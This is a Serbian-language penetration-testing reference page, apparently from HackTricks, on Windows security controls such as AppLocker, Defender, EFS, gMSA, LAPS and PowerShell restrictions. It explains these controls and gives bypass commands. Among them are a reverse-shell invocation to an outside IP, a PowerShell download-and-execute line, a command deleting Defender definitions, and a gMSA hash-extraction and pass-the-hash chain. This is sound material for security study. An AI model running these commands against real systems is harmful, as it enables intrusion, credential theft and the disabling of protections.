# Kontrole bezbednosti Windowsa

{{#include ../../banners/hacktricks-training.md}}

## AppLocker politika

Lista dozvoljenih aplikacija (application whitelist) je spisak odobrenih softverskih aplikacija ili izvršnih fajlova koji su dozvoljeni da budu prisutni i pokreću se na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoftovo **rešenje za bele liste aplikacija** i daje administratorima sistema kontrolu nad **time koje aplikacije i fajlove korisnici mogu pokretati**. Pruža **detaljnu kontrolu** nad izvršnim fajlovima, skriptama, Windows installer fajlovima, DLL-ovima, paketiranim aplikacijama i instalaterima paketiranih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i prava za upis u određene direktorijume, **ali sve to se može zaobići**.

### Provera

Proverite koji fajlovi/ekstenzije su na crnoj/beloj listi:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja u registru sadrži konfiguracije i politike koje primenjuje AppLocker, omogućavajući pregled trenutnog skupa pravila koja se sprovode na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisne **Writable folders** za bypass AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti da **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Često **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binari mogu takođe biti korisni za zaobilaženje AppLocker-a.
- **Loše napisana pravila se takođe mogu zaobići**
- Na primer, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i biće dozvoljen.
- Organizacije često fokusiraju na **blokiranje `%System32%\WindowsPowerShell\v1.0\powershell.exe` izvršne datoteke**, ali zaborave na **druge** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement very rarely enabled** zbog dodatnog opterećenja koje može prouzrokovati sistemu, i količine testiranja potrebne da se osigura da ništa neće puknuti. Dakle, korišćenje **DLLs as backdoors will help bypassing AppLocker**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **execute Powershell** kod u bilo kojem procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

Lokalni kredencijali nalaze se u ovoj datoteci; lozinke su heširane.

### Local Security Authority (LSA) - LSASS

The **credentials** (hashed) are **saved** in the **memory** of this subsystem for Single Sign-On reasons.\
**LSA** administrates the local **security policy** (password policy, users permissions...), **authentication**, **access tokens**...\
LSA will be the one that will **check** for provided credentials inside the **SAM** file (for a local login) and **talk** with the **domain controller** to authenticate a domain user.

The **credentials** are **saved** inside the **process LSASS**: Kerberos tickets, hashes NT and LM, easily decrypted passwords.

### LSA secrets

LSA može sačuvati na disku određene kredencijale:

- Lozinka računarskog naloga Active Directory (ako je domain controller nedostupan).
- Lozinke naloga Windows servisa
- Lozinke za zakazane zadatke
- Još (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutan je samo na Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus dostupan u Windows 10 i Windows 11, i u verzijama Windows Server. On **blokira** uobičajene pentesting alate kao što su **`WinPEAS`**. Međutim, postoje načini da se ove zaštite **zaobiđu**.

### Check

Da biste proverili **status** Defender-a možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da znate da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Za enumeraciju možete takođe pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Šifrovani fajl sistem (EFS)

EFS štiti fajlove enkripcijom, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ je šifrovan korisnikovim **javni ključ** i smešten u šifrovanom fajlu's $EFS **alternative data stream**. Kada je potrebna dešifrovanje, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata se koristi za dešifrovanje FEK-a iz $EFS strima. Više detalja možete naći [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Slučajevi dešifrovanja bez inicijative korisnika** uključuju:

- Kada se fajlovi ili fascikle prebace na fajl sistem koji nije EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), oni se automatski dešifruju.
- Šifrovani fajlovi koji se šalju preko mreže putem SMB/CIFS protokola dešifruju se pre prenosa.

Ovaj metod enkripcije omogućava **transparentan pristup** šifrovanim fajlovima za vlasnika. Međutim, samo menjanje vlasnikove lozinke i prijava neće omogućiti dešifrovanje.

**Ključne napomene**:

- EFS koristi simetrični FEK, šifrovan korisnikovim javnim ključem.
- Dešifrovanje koristi korisnikov privatni ključ za pristup FEK-u.
- Automatsko dešifrovanje se događa u specifičnim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Šifrovani fajlovi su dostupni vlasniku bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **korisnik** koristio ovu **uslugu** proverom da li postoji putanja: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** fajlu koristeći `cipher /c \<file\>`  
Takođe možete koristiti `cipher /e` i `cipher /d` unutar foldera da **šifrujete** i **dešifrujete** sve fajlove

### Dešifrovanje EFS fajlova

#### Kao SYSTEM nalog

Ovaj način zahteva da **žrtvovani korisnik** pokreće **proces** na hostu. Ako je to slučaj, koristeći `meterpreter` sesiju možete impersonirati token procesa korisnika (`impersonate_token` iz `incognito`). Ili možete jednostavno `migrate` u proces korisnika.

#### Poznavanje lozinke korisnika


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Grupno upravljani servisni nalozi (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** da pojednostavi upravljanje servisnim nalozima u IT infrastrukturi. Za razliku od tradicionalnih servisnih naloga koji često imaju omogućeno podešavanje "**Password never expire**", gMSA nude sigurnije i lakše za upravljanje rešenje:

- **Automatic Password Management**: gMSA koriste kompleksnu lozinku od 240 karaktera koja se automatski menja u skladu sa politikom domena ili računara. Ovaj proces je u nadležnosti Microsoft's Key Distribution Service (KDC), eliminišući potrebu za ručnim ažuriranjem lozinki.
- **Enhanced Security**: Ovi nalozi su imuni na zaključavanja i ne mogu se koristiti za interaktivne prijave, čime se povećava njihova sigurnost.
- **Multiple Host Support**: gMSA se mogu deliti između više hostova, što ih čini pogodnim za servise koji rade na više servera.
- **Scheduled Task Capability**: Za razliku od managed service accounts, gMSA podržavaju izvršavanje zakazanih zadataka.
- **Simplified SPN Management**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMAccount imenima računara ili DNS imenu, čime se pojednostavljuje upravljanje SPN-ovima.

Lozinke za gMSA se čuvaju u LDAP svojstvu _**msDS-ManagedPassword**_ i automatski se resetuju na svakih 30 dana od strane Domain Controller-a (DC). Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može da bude preuzeta samo od strane ovlašćenih administratora i servera na kojima su gMSA instalirani, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potreban je zaštićeni konekcija kao što je LDAPS, ili konekcija mora biti autentifikovana sa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Takođe, pogledajte ovu [web page](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvesti **NTLM relay attack** da biste pročitali **password** od **gMSA**.

### Zloupotreba ACL chaining-a za čitanje gMSA managed password (GenericAll -> ReadGMSAPassword)

U mnogim okruženjima, korisnici sa niskim privilegijama mogu da dođu do gMSA tajni bez kompromitovanja DC-a zloupotrebom pogrešno konfigurisanih object ACL-ova:

- Grupi kojom možete da upravljate (npr. preko GenericAll/GenericWrite) je dodeljeno `ReadGMSAPassword` nad gMSA.
- Dodavanjem sebe u tu grupu nasledite pravo da pročitate gMSA-ov `msDS-ManagedPassword` blob preko LDAP-a i izvedete upotrebljive NTLM credentials.

Tipičan tok rada:

1) Otkrijte put koristeći BloodHound i označite vaše foothold principals kao Owned. Potražite veze poput:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodajte sebe u međugrupu kojom upravljate (primer sa bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Pročitajte gMSA upravljanu lozinku preko LDAP-a i izvedite NTLM hash. NetExec automatizuje ekstrakciju `msDS-ManagedPassword` i konverziju u NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
Autentifikujte se kao gMSA koristeći NTLM hash (nije potreban plaintext). Ako je nalog u Remote Management Users, WinRM će raditi direktno:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Napomene:
- LDAP čitanja atributa `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Alati to obično odrade automatski.
- gMSAs često dobijaju lokalna prava kao što su WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste planirali lateral movement.
- Ako vam treba samo blob da biste sami izračunali NTLM, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lokalnim lozinkama Administratora. Ove lozinke, koje su **nasumično generisane**, jedinstvene i **redovno menjane**, čuvaju se centralno u Active Directory. Pristup ovim lozinkama je ograničen putem ACLs samo ovlašćenim korisnicima. Ako su dodeljene dovoljne dozvole, omogućeno je čitanje lokalnih admin lozinki.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dopuštanje samo odobrenih .NET tipova, XAML-based workflows, PowerShell classes i drugo.

### **Proveri**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
U trenutnim verzijama Windows-a taj Bypass neće raditi, ali možete koristiti[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Za kompajliranje možda ćete morati** **da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **execute Powershell** code u bilo kojem procesu i zaobiđete constrained mode. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution Policy

Podrazumevano je postavljeno na **restricted.** Glavni načini za zaobilaženje ove politike:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfejs Security Support Provider (SSPI)

Je API koji se može koristiti za autentifikaciju korisnika.

SSPI će biti zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. Zatim će SSPI pregovarati koji će se authentication protocol koristiti — ti authentication protocolli se zovu Security Support Provider (SSP), nalaze se na svakoj Windows mašini u obliku DLL-a i obe mašine moraju podržavati isti da bi mogle da komuniciraju.

### Glavni SSP-ovi

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: Iz razloga kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers and LDAP, lozinka u obliku MD5 heša
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje koji protokol će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi više metoda ili samo jednu.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **upit za saglasnost za aktivnosti sa povišenim privilegijama**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
